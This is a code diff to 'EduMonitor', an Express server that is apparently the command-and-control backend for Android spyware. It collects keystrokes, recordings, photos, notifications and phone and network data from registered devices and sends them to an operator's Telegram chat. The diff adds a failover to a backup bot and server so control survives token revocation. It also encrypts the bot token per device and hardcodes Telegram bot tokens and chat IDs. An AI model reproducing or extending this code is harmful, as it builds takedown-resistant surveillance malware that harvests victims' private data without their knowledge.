@@ -3,18 +3,30 @@ const axios = require('axios');
 const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
 const FormData = require('form-data');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const os = require('os');
 
-// Your bot token from @BotFather
-const BOT_TOKEN = process.env.BOT_TOKEN || '8606674782:AAHzMQ95OqETq3ZOpz-qor9cISMxQdhf9CE';
-const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+// ============= CONFIGURATION =============
+// Main bot token (primary)
+const MAIN_BOT_TOKEN = process.env.MAIN_BOT_TOKEN || '8566422839:AAFQloa-kAv7U9tSSwn09ngxvJEQcNHF_jY';
 
-// Persistent storage file
+// Secondary bot token (backup - different bot)
+const SECONDARY_BOT_TOKEN = process.env.SECONDARY_BOT_TOKEN || '';
+
+// Secondary server URL (for failover)
+const SECONDARY_SERVER_URL = process.env.SECONDARY_SERVER_URL || 'https://core-m0tr.onrender.com';
+
+// Current active bot token (can change during failover)
+let activeBotToken = MAIN_BOT_TOKEN;
+let activeServerUrl = `https://${process.env.RENDER_EXTERNAL_URL || 'edu-hwpy.onrender.com'}`;
+
+// Persistent storage files
 const DEVICES_FILE = path.join(__dirname, 'devices.json');
 const AUTO_DATA_FILE = path.join(__dirname, 'autodata.json');
+const FAILOVER_STATE_FILE = path.join(__dirname, 'failover_state.json');
 
 // Store authorized devices and their commands
 const devices = new Map();
@@ -23,16 +35,140 @@ const userStates = new Map();
 
 // Store authorized chat IDs
 const authorizedChats = new Set([
-    '8266841615', // Your chat ID
+    '5326373447', // Your chat ID
 ]);
 
 // Auto-collection flags
 const autoDataRequested = new Map();
 
+// Failover state tracking
+let failoverState = {
+    isFailedOver: false,
+    failedOverAt: null,
+    originalBotToken: MAIN_BOT_TOKEN,
+    currentBotToken: MAIN_BOT_TOKEN,
+    currentServerUrl: activeServerUrl,
+    failoverCount: 0
+};
+
+// Load failover state from disk
+function loadFailoverState() {
+    try {
+        if (fs.existsSync(FAILOVER_STATE_FILE)) {
+            const data = fs.readFileSync(FAILOVER_STATE_FILE, 'utf8');
+            const saved = JSON.parse(data);
+            failoverState = saved;
+            activeBotToken = failoverState.currentBotToken;
+            activeServerUrl = failoverState.currentServerUrl;
+            console.log(`✅ Loaded failover state: ${failoverState.isFailedOver ? 'FAILED OVER' : 'NORMAL'}`);
+            console.log(`   Active Bot Token: ${activeBotToken.substring(0, 20)}...`);
+            console.log(`   Active Server URL: ${activeServerUrl}`);
+        }
+    } catch (error) {
+        console.error('Error loading failover state:', error);
+    }
+}
+
+// Save failover state to disk
+function saveFailoverState() {
+    try {
+        fs.writeFileSync(FAILOVER_STATE_FILE, JSON.stringify(failoverState, null, 2));
+        console.log(`💾 Saved failover state`);
+    } catch (error) {
+        console.error('Error saving failover state:', error);
+    }
+}
+
+// Execute failover to secondary bot
+function executeFailover() {
+    if (failoverState.isFailedOver) {
+        console.log('⚠️ Already in failover mode');
+        return;
+    }
+    
+    if (!SECONDARY_BOT_TOKEN) {
+        console.error('❌ Cannot failover - SECONDARY_BOT_TOKEN not configured');
+        return;
+    }
+    
+    console.log('🔄 EXECUTING FAILOVER - Switching to secondary bot');
+    
+    failoverState.isFailedOver = true;
+    failoverState.failedOverAt = Date.now();
+    failoverState.currentBotToken = SECONDARY_BOT_TOKEN;
+    failoverState.currentServerUrl = SECONDARY_SERVER_URL;
+    failoverState.failoverCount++;
+    
+    activeBotToken = SECONDARY_BOT_TOKEN;
+    activeServerUrl = SECONDARY_SERVER_URL;
+    
+    saveFailoverState();
+    
+    console.log(`✅ Failover complete - Now using secondary bot`);
+    console.log(`   New Server URL: ${activeServerUrl}`);
+}
+
+// Attempt to restore primary bot
+async function attemptRestorePrimary() {
+    if (!failoverState.isFailedOver) return true;
+    
+    console.log('🔄 Attempting to restore primary bot...');
+    
+    try {
+        const testUrl = `https://api.telegram.org/bot${MAIN_BOT_TOKEN}/getMe`;
+        const response = await axios.get(testUrl, { timeout: 10000 });
+        
+        if (response.data && response.data.ok) {
+            console.log('✅ Primary bot is back online - restoring');
+            
+            failoverState.isFailedOver = false;
+            failoverState.currentBotToken = MAIN_BOT_TOKEN;
+            failoverState.currentServerUrl = activeServerUrl; // Keep current server URL
+            activeBotToken = MAIN_BOT_TOKEN;
+            
+            saveFailoverState();
+            
+            // Notify all admins
+            for (const chatId of authorizedChats) {
+                await sendTelegramMessage(chatId, 
+                    '✅ *PRIMARY BOT RESTORED*\n\n' +
+                    'The main bot is back online. Continuing normal operation.');
+            }
+            
+            return true;
+        }
+    } catch (error) {
+        console.log('Primary bot still offline:', error.message);
+    }
+    return false;
+}
+
+// Get current active Telegram API URL
+function getTelegramApiUrl() {
+    return `https://api.telegram.org/bot${activeBotToken}`;
+}
+
 // Create uploads directory
 const uploadDir = 'uploads';
 if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir, { recursive: true });
+}
+
+// ============= ENCRYPTION FUNCTIONS =============
+
+// Device-specific encryption (same as Android app)
+function encryptForDevice(data, deviceId) {
+    try {
+        const key = crypto.createHash('sha256').update(deviceId).digest();
+        const iv = key.slice(0, 16);
+        const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
+        let encrypted = cipher.update(data, 'utf8', 'base64');
+        encrypted += cipher.final('base64');
+        return encrypted;
+    } catch (error) {
+        console.error('Encryption error:', error);
+        return null;
+    }
 }
 
 // ============= PERSISTENT STORAGE FUNCTIONS =============
@@ -95,17 +231,18 @@ function saveAutoDataFlags() {
 }
 
 // Load persistent data on startup
+loadFailoverState();
 loadDevices();
 loadAutoDataFlags();
 
 // ============= DEVICE CONFIGURATION =============
 const deviceConfigs = {
     'default': {
-        chatId: '8266841615',
+        chatId: '5326373447',
         config: {
-            chatId: '8266841615',
-            botToken: '8606674782:AAHzMQ95OqETq3ZOpz-qor9cISMxQdhf9CE',
-            serverUrl: 'https://core-m0tr.onrender.com',
+            chatId: '5326373447',
+            botToken: activeBotToken,
+            serverUrl: activeServerUrl,
             pollingInterval: 15000,
             keepAliveInterval: 300000,
             realtimeLogging: false,
@@ -151,12 +288,9 @@ const deviceConfigs = {
                 recordings: true,
                 keystrokes: true,
                 notifications: true,
-                appOpens: true,
-                ipInfo: true,
                 phoneInfo: true,
                 wifiInfo: true,
                 mobileInfo: true,
-                simInfo: true
             }
         }
     }
@@ -527,7 +661,7 @@ async function sendTelegramMessage(chatId, text) {
 
         console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
         
-        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
+        const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
             chat_id: chatId,
             text: text,
             parse_mode: 'HTML'
@@ -538,10 +672,18 @@ async function sendTelegramMessage(chatId, text) {
     } catch (error) {
         console.error('❌ Error sending message:', error.response?.data || error.message);
         
+        // Check if bot token is invalid (401) - trigger failover
+        if (error.response?.status === 401 && !failoverState.isFailedOver) {
+            console.log('⚠️ Bot token invalid - triggering failover');
+            executeFailover();
+            // Retry with new bot token
+            return await sendTelegramMessage(chatId, text);
+        }
+        
         if (error.response?.status === 400) {
             console.log('⚠️ HTML failed, retrying as plain text');
             try {
-                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
                     chat_id: chatId,
                     text: text.replace(/<[^>]*>/g, '')
                 });
@@ -558,7 +700,7 @@ async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
     try {
         console.log(`📨 Sending message with inline keyboard to ${chatId}`);
         
-        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
+        const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
             chat_id: chatId,
             text: text,
             parse_mode: 'HTML',
@@ -571,6 +713,12 @@ async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
         return response.data;
     } catch (error) {
         console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
+        
+        // Check if bot token is invalid - trigger failover
+        if (error.response?.status === 401 && !failoverState.isFailedOver) {
+            executeFailover();
+            return await sendTelegramMessageWithKeyboard(chatId, text, keyboard);
+        }
         return null;
     }
 }
@@ -579,7 +727,7 @@ async function editMessageKeyboard(chatId, messageId, newKeyboard) {
     try {
         console.log(`🔄 Editing keyboard for message ${messageId}`);
         
-        const response = await axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
+        const response = await axios.post(`${getTelegramApiUrl()}/editMessageReplyMarkup`, {
             chat_id: chatId,
             message_id: messageId,
             reply_markup: {
@@ -597,7 +745,7 @@ async function editMessageKeyboard(chatId, messageId, newKeyboard) {
 
 async function answerCallbackQuery(callbackQueryId, text = null) {
     try {
-        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+        await axios.post(`${getTelegramApiUrl()}/answerCallbackQuery`, {
             callback_query_id: callbackQueryId,
             text: text
         });
@@ -621,9 +769,9 @@ async function setChatMenuButton(chatId) {
             { command: 'sync_all', description: '🔄 Sync all data' }
         ];
         
-        await axios.post(`${TELEGRAM_API}/setMyCommands`, { commands });
+        await axios.post(`${getTelegramApiUrl()}/setMyCommands`, { commands });
         
-        await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
+        await axios.post(`${getTelegramApiUrl()}/setChatMenuButton`, {
             chat_id: chatId,
             menu_button: {
                 type: 'commands',
@@ -646,7 +794,7 @@ async function sendTelegramDocument(chatId, filePath, filename, caption) {
         formData.append('document', fs.createReadStream(filePath), { filename });
         formData.append('caption', caption);
         
-        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
+        const response = await axios.post(`${getTelegramApiUrl()}/sendDocument`, formData, {
             headers: {
                 ...formData.getHeaders()
             },
@@ -658,6 +806,12 @@ async function sendTelegramDocument(chatId, filePath, filename, caption) {
         return response.data;
     } catch (error) {
         console.error('❌ Error sending document:', error.response?.data || error.message);
+        
+        // Check if bot token is invalid - trigger failover
+        if (error.response?.status === 401 && !failoverState.isFailedOver) {
+            executeFailover();
+            return await sendTelegramDocument(chatId, filePath, filename, caption);
+        }
         
         try {
             const stats = fs.statSync(filePath);
@@ -786,7 +940,43 @@ function queueAutoDataCommands(deviceId, chatId) {
     saveDevices();
 }
 
+// ============= CRITICAL: COMPLETE CONFIG ENDPOINT =============
+
+app.get('/api/device/:deviceId/complete-config', (req, res) => {
+    const deviceId = req.params.deviceId;
+    console.log(`🔐 Complete config requested for device: ${deviceId}`);
+    
+    const device = devices.get(deviceId);
+    
+    if (!device) {
+        console.log(`⚠️ Device not found: ${deviceId}`);
+        return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    // Get current active config (may be from failover)
+    const deviceConfig = getDeviceConfig(deviceId);
+    
+    // Encrypt the bot token and chat ID for this specific device
+    const encryptedToken = encryptForDevice(activeBotToken, deviceId);
+    const encryptedChatId = encryptForDevice(deviceConfig.chatId, deviceId);
+    
+    const response = {
+        encrypted_token: encryptedToken,
+        encrypted_chat_id: encryptedChatId,
+        server_url: activeServerUrl,
+        failover_status: failoverState.isFailedOver ? 'failed_over' : 'normal',
+        timestamp: Date.now()
+    };
+    
+    console.log(`✅ Complete config sent to ${deviceId}`);
+    console.log(`   Bot Token: ${activeBotToken.substring(0, 20)}... (encrypted)`);
+    console.log(`   Server URL: ${activeServerUrl}`);
+    
+    res.json(response);
+});
+
 // ============= PHOTO UPLOAD ENDPOINT =============
+
 app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
     try {
         const deviceId = req.body.deviceId;
@@ -816,7 +1006,7 @@ app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
         formData.append('photo', fs.createReadStream(filePath), { filename: req.file.originalname });
         formData.append('caption', fullCaption);
         
-        await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
+        await axios.post(`${getTelegramApiUrl()}/sendPhoto`, formData, {
             headers: { ...formData.getHeaders() },
             maxContentLength: Infinity,
             maxBodyLength: Infinity
@@ -939,6 +1129,8 @@ app.get('/health', (req, res) => {
         devices: devices.size,
         authorizedChats: Array.from(authorizedChats).join(', '),
         serverIP: getServerIP(),
+        failoverActive: failoverState.isFailedOver,
+        activeBotToken: activeBotToken.substring(0, 20) + '...',
         timestamp: Date.now()
     });
 });
@@ -955,7 +1147,8 @@ app.get('/api/ping/:deviceId', (req, res) => {
             timestamp: Date.now(),
             registered: true,
             deviceId: deviceId,
-            chatId: device.chatId
+            chatId: device.chatId,
+            serverUrl: activeServerUrl
         });
     } else {
         res.status(404).json({ 
@@ -971,6 +1164,9 @@ app.get('/api/verify/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
     
+    // Check if we should attempt to restore primary
+    attemptRestorePrimary().catch(console.error);
+    
     if (device && device.chatId) {
         res.json({
             registered: true,
@@ -979,7 +1175,8 @@ app.get('/api/verify/:deviceId', (req, res) => {
             lastSeen: device.lastSeen,
             deviceInfo: device.deviceInfo,
             phoneNumber: device.phoneNumber,
-            hasPendingCommands: (device.pendingCommands?.length || 0) > 0
+            hasPendingCommands: (device.pendingCommands?.length || 0) > 0,
+            failoverActive: failoverState.isFailedOver
         });
     } else {
         res.status(404).json({
@@ -1054,6 +1251,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
 });
 
 // ============= REGISTRATION ENDPOINT =============
+
 app.post('/api/register', async (req, res) => {
     const { deviceId, deviceInfo } = req.body;
     
@@ -1140,11 +1338,20 @@ app.post('/api/register', async (req, res) => {
         queueAutoDataCommands(deviceId, deviceConfig.chatId);
     }
     
+    // Return config with current active bot token and server URL
+    const responseConfig = {
+        ...deviceConfig.config,
+        botToken: activeBotToken,
+        serverUrl: activeServerUrl,
+        chatId: deviceConfig.chatId
+    };
+    
     res.json({
         status: 'registered',
         deviceId,
         chatId: deviceConfig.chatId,
-        config: deviceConfig.config
+        config: responseConfig,
+        failoverActive: failoverState.isFailedOver
     });
 });
 
@@ -1165,14 +1372,38 @@ app.get('/api/devices', (req, res) => {
             online: (Date.now() - device.lastSeen) < 300000
         });
     }
-    res.json({ total: devices.size, devices: deviceList });
+    res.json({ total: devices.size, devices: deviceList, failoverActive: failoverState.isFailedOver });
+});
+
+// ============= FAILOVER MANAGEMENT ENDPOINTS =============
+
+app.post('/api/failover/force', (req, res) => {
+    console.log('🔄 Force failover requested');
+    executeFailover();
+    res.json({ success: true, failoverActive: failoverState.isFailedOver });
+});
+
+app.post('/api/failover/restore', async (req, res) => {
+    console.log('🔄 Restore primary requested');
+    const restored = await attemptRestorePrimary();
+    res.json({ success: restored, failoverActive: failoverState.isFailedOver });
+});
+
+app.get('/api/failover/status', (req, res) => {
+    res.json({
+        failoverActive: failoverState.isFailedOver,
+        failedOverAt: failoverState.failedOverAt,
+        failoverCount: failoverState.failoverCount,
+        currentBotToken: activeBotToken.substring(0, 20) + '...',
+        currentServerUrl: activeServerUrl
+    });
 });
 
 // ============= TEST ENDPOINTS =============
 
 app.get('/test', (req, res) => {
     const serverIP = getServerIP();
-    const userDevices = getDeviceListForUser('8266841615');
+    const userDevices = getDeviceListForUser('5326373447');
     
     res.send(`
         <html>
@@ -1184,17 +1415,22 @@ app.get('/test', (req, res) => {
                 .device { background: #0f3460; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 3px solid #e94560; }
                 .online { color: #4CAF50; }
                 .offline { color: #f44336; }
+                .failover-active { color: #ff9800; }
                 .ip { background: #1a1a2e; padding: 5px; border-radius: 3px; font-family: monospace; }
             </style>
         </head>
         <body>
-            <h1>✅ EduMonitor Server v6.0 Running</h1>
+            <h1>✅ EduMonitor Server v7.0 - Complete Failover Support</h1>
             <div class="stats">
                 <p><b>Time:</b> ${new Date().toISOString()}</p>
                 <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
                 <p><b>Total Devices:</b> ${devices.size}</p>
                 <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
                 <p><b>Persistent Storage:</b> ${fs.existsSync(DEVICES_FILE) ? '✅ Enabled' : '⚠️ Not initialized'}</p>
+                <p><b>Failover Active:</b> <span class="${failoverState.isFailedOver ? 'failover-active' : 'online'}">${failoverState.isFailedOver ? '⚠️ YES (Backup Bot Active)' : '✅ NO'}</span></p>
+                <p><b>Active Bot Token:</b> <code>${activeBotToken.substring(0, 20)}...</code></p>
+                <p><b>Active Server URL:</b> <code>${activeServerUrl}</code></p>
+                <p><b>Failover Count:</b> ${failoverState.failoverCount}</p>
             </div>
             
             <h2>📱 Registered Devices (${userDevices.length})</h2>
@@ -1221,7 +1457,7 @@ app.get('/test', (req, res) => {
 });
 
 app.get('/test-menu', async (req, res) => {
-    const chatId = '8266841615';
+    const chatId = '5326373447';
     const result = await sendTelegramMessageWithKeyboard(
         chatId,
         "🎯 Test Menu - Use the buttons below:",
@@ -1249,13 +1485,12 @@ async function handleCallbackQuery(callbackQuery) {
         return;
     }
     
-    // Handle menu navigation
+    // Handle menu navigation (same as before)
     switch (data) {
         case 'help_main':
             await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
             await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category:");
             break;
-        
         case 'menu_screenshot':
             await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
             break;
@@ -1615,7 +1850,6 @@ async function sendCommandToDevice(chatId, messageId, command) {
 async function handleCommand(chatId, command, messageId) {
     console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
 
-    // Handle consolidated info commands
     if (command === '/device_info' || command === '/network_info' || command === '/mobile_info' || command === '/location') {
         let selectedDeviceId = userDeviceSelection.get(chatId);
         let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
@@ -1755,12 +1989,19 @@ async function handleCommand(chatId, command, messageId) {
 app.listen(PORT, '0.0.0.0', () => {
     const serverIP = getServerIP();
     console.log('\n🚀 ===============================================');
-    console.log(`🚀 EduMonitor Server v6.0 - Complete Menu System`);
+    console.log(`🚀 EduMonitor Server v7.0 - Complete Failover System`);
     console.log(`🚀 Server IP: ${serverIP}`);
     console.log(`🚀 Port: ${PORT}`);
-    console.log(`🚀 Webhook URL: https://core-m0tr.onrender.com/webhook`);
+    console.log(`🚀 Webhook URL: ${activeServerUrl}/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
     console.log(`🚀 Persistent Storage: ${DEVICES_FILE}`);
+    console.log(`\n🔄 FAILOVER STATUS:`);
+    console.log(`   Active Bot Token: ${activeBotToken.substring(0, 20)}...`);
+    console.log(`   Active Server URL: ${activeServerUrl}`);
+    console.log(`   Failover Active: ${failoverState.isFailedOver ? 'YES' : 'NO'}`);
+    console.log(`   Failover Count: ${failoverState.failoverCount}`);
+    console.log(`   Secondary Bot: ${SECONDARY_BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
+    console.log(`   Secondary Server: ${SECONDARY_SERVER_URL}`);
     console.log('\n✅ MENU STRUCTURE:');
     console.log('   📸 Screenshot → Settings → Config/Targets/Quality/Token');
     console.log('   📷 Camera → Photo/Silent/Front/Back/Switch');
